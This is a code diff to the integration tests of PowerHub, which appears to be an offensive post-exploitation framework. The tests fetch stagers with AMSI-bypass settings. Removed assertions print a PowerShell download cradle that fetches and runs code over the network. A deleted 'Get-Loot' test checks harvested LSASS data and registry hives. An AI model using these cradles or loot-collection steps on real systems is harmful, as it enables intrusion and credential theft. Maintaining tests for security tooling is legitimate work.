@@ -4,7 +4,7 @@
 import os
 import sys
 import time
-#  import tempfile
+import tempfile
 import re
 import random
 import requests
@@ -28,50 +28,50 @@ def get_stager():
     param_set = {
         'default': {
             "flavor": "hub",
-            "Launcher": "powershell",
-            "Amsi": "reflection",
-            "SeparateAMSI": "true",
-            "Transport": "http",
-            "ClipExec": "none",
-            "Proxy": "false",
-            "TLS1.2": "false",
-            "Fingerprint": "true",
-            "NoVerification": "false",
-            "CertStore": "false",
+            "launcher": "powershell",
+            "amsi": "reflection",
+            "transport": "http",
+            "clip-exec": "none",
+            "proxy": "false",
+            "tlsv1.2": "false",
+            "fingerprint": "true",
+            "noverification": "false",
+            "certStore": "false",
         },
         'HTTPS': {
             "flavor": "hub",
-            "Launcher": "powershell",
-            "Amsi": "reflection",
-            "SeparateAMSI": "true",
-            "Transport": "https",
-            "ClipExec": "none",
-            "Proxy": "false",
-            "TLS1.2": "false",
-            "Fingerprint": "true",
-            "NoVerification": "false",
-            "CertStore": "false",
+            "launcher": "powershell",
+            "amsi": "reflection",
+            "transport": "https",
+            "clip-exec": "none",
+            "proxy": "false",
+            "tlsv1.2": "false",
+            "fingerprint": "true",
+            "noverification": "false",
+            "certStore": "false",
         },
         'BASH': {
             "flavor": "hub",
-            "Launcher": "bash",
-            "Amsi": "reflection",
-            "SeparateAMSI": "true",
-            "Transport": "http",
-            "ClipExec": "none",
-            "Proxy": "false",
-            "TLS1.2": "false",
-            "Fingerprint": "true",
-            "NoVerification": "false",
-            "CertStore": "false",
+            "launcher": "bash",
+            "amsi": "reflection",
+            "transport": "http",
+            "clip-exec": "none",
+            "proxy": "false",
+            "tlsv1.2": "false",
+            "fingerprint": "true",
+            "noverification": "false",
+            "certStore": "false",
         },
     }
     i = 0
     while i < 10:
         try:
             for k, v in param_set.items():
-                response = requests.get(f"http://{TEST_URI}:{PORT}/dlcradle",
-                                        params=v).text
+                response = requests.get(
+                    f"http://{TEST_URI}:{PORT}/dlcradle",
+                    params=v,
+                    headers={'Accept': 'text/html'},
+                ).text
                 soup = bs4.BeautifulSoup(response, features='lxml')
                 result[k] = soup.find('code').getText()
             break
@@ -84,10 +84,10 @@ def get_stager():
 
 def create_modules():
     func = "function Invoke-Testfunc%(n)d { Write-Host 'Test%(n)d' }"
-    from powerhub.directories import MOD_DIR
+    from powerhub.directories import directories
     for i in range(MAX_TEST_MODULE_PS1):
         with open(
-            os.path.join(MOD_DIR, "psmod%d.ps1" % i),
+            os.path.join(directories.MOD_DIR, "psmod%d.ps1" % i),
             "w"
         ) as f:
             f.write(func % {"n": i})
@@ -95,27 +95,30 @@ def create_modules():
 
 @pytest.fixture(scope="module")
 def full_app():
-    from powerhub.app import PowerHubApp
-    app = PowerHubApp()
-    app.run(background=True)
-    create_modules()
-    yield get_stager()
-    app.stop()
+    with tempfile.TemporaryDirectory(
+        prefix='powerhub_tests',
+        ignore_cleanup_errors=True,
+    ) as tmpdir:
+        os.environ['XDG_DATA_HOME'] = tmpdir
+
+        from powerhub.args import parse_args
+        from powerhub.app import PowerHubApp
+
+        args = parse_args([TEST_URI, '--no-auth'])
+        app = PowerHubApp(args)
+        app.run(background=True)
+        create_modules()
+
+        yield get_stager()
+
+        app.stop()
 
 
 def test_stager(full_app):
-    assert (
-        "$K=New-Object Net.WebClient;'a=reflection','t=http'|%{IEX "
-        + f"$K.DownloadString('http://{TEST_URI}:8080"
-        + "/0?'+$_)"
-    ) in (full_app['default'])
+    assert "New-Object Net.WebClient" in full_app['default']
+    assert f"DownloadString('https://{TEST_URI}:" in full_app['default']
     assert (
         "[System.Net.ServicePointManager]::ServerCertificateValidationCallback"
-        + "={param($1,$2);$2.Thumbprint -eq '"
-    ) in (full_app['HTTPS'])
-    assert (
-        "'};$K=New-Object Net.WebClient;'a=reflection','t=https'|%{IEX "
-        + f"$K.DownloadString('https://{TEST_URI}:8443/0?'+$_)" + "}"
     ) in (full_app['HTTPS'])
 
 
@@ -140,7 +143,7 @@ def backends(full_app):
     }
 
 
-@pytest.fixture(scope="module", params=["win7", "win10"])
+@pytest.fixture(scope="module", params=["win10"])
 def backend(request, backends):
     """Parameterize backends"""
     return backends[request.param]
@@ -159,29 +162,34 @@ def test_list_hubmodules(backend):
 
 
 def test_load_hubmodule(backend):
-    out = execute_cmd(backend("lhm psmod53|fl;Invoke-Testfunc53"))
+    out = execute_cmd(backend("ghm psmod53|fl;Invoke-Testfunc53"))
     assert "Test53" in out
     assert "psmod53" in out
     assert re.search("Name *: .*psmod53.ps1\r\n", out)
     assert re.search("Type *: ps1\r\n", out)
-    assert re.search("N *: 72\r\n", out)
+    assert re.search("N *: 53\r\n", out)
     assert re.search("Loaded *: True\r\n", out)
 
 
 def test_load_hubmodule_range(backend):
     out = execute_cmd(
-        backend('$p="72-74,77";lhm $p;Invoke-Testfunc53;'
-                + "Invoke-Testfunc99;Invoke-Testfunc47;Invoke-Testfunc72;")
+        backend(
+            '$p="72-74,77,90-93";ghm $p;'
+            "Invoke-Testfunc72;Invoke-Testfunc73;Invoke-Testfunc74;"
+            "Invoke-Testfunc77;"
+            "Invoke-Testfunc90;Invoke-Testfunc92;Invoke-Testfunc93;"
+        )
     )
-    # I don't understand the order of the modules
-    assert "Test53" in out
-    assert "Test99" in out
-    assert "Test47" in out
     assert "Test72" in out
+    assert "Test73" in out
+    assert "Test74" in out
+    assert "Test77" in out
+    assert "Test90" in out
+    assert "Test93" in out
 
 
 def test_upload(backend):
-    from powerhub.directories import UPLOAD_DIR
+    from powerhub.directories import directories
     testfile = "testfile-%030x.dat" % random.randrange(16**30)
     out = execute_cmd(
         backend(('$p=Join-Path $env:TEMP "%s";'
@@ -190,7 +198,7 @@ def test_upload(backend):
     )
     time.sleep(1)
     assert "At line:" not in out  # "At line:" means PS error
-    with open(os.path.join(UPLOAD_DIR, testfile), "rb") as f:
+    with open(os.path.join(directories.UPLOAD_DIR, testfile), "rb") as f:
         data = f.read()
     assert data == bytes(range(1, 256))
 
@@ -199,27 +207,6 @@ def test_upload(backend):
     )
     time.sleep(1)
     assert "At line:" not in out  # "At line:" means PS error
-    with open(os.path.join(UPLOAD_DIR, testfile+".1"), "rb") as f:
+    with open(os.path.join(directories.UPLOAD_DIR, testfile+".1"), "rb") as f:
         data = f.read()
     assert data == b"FooBar123"
-
-
-def test_get_loot(backend):
-    from powerhub import sql
-    loot_count = len(sql.get_loot())
-    out = execute_cmd(backend('Get-Loot'))
-    assert "At line:" not in out  # "At line:" means PS error
-    #  for i in range(60):
-    #      time.sleep(1)
-    #      loot = sql.get_loot()
-    #      if (loot and loot[0].lsass and loot[0].hive and loot[0].sysinfo):
-    #          break
-    #  assert i < 59
-    loot = sql.get_loot()
-    assert loot_count + 1 == len(loot)
-    loot = loot[-1]
-    assert "Administrator" in loot.hive
-    assert "500" in loot.hive
-    assert "Microsoft Windows" in loot.sysinfo
-    assert "isadmin" in loot.sysinfo
-    assert "session_id" in loot.lsass
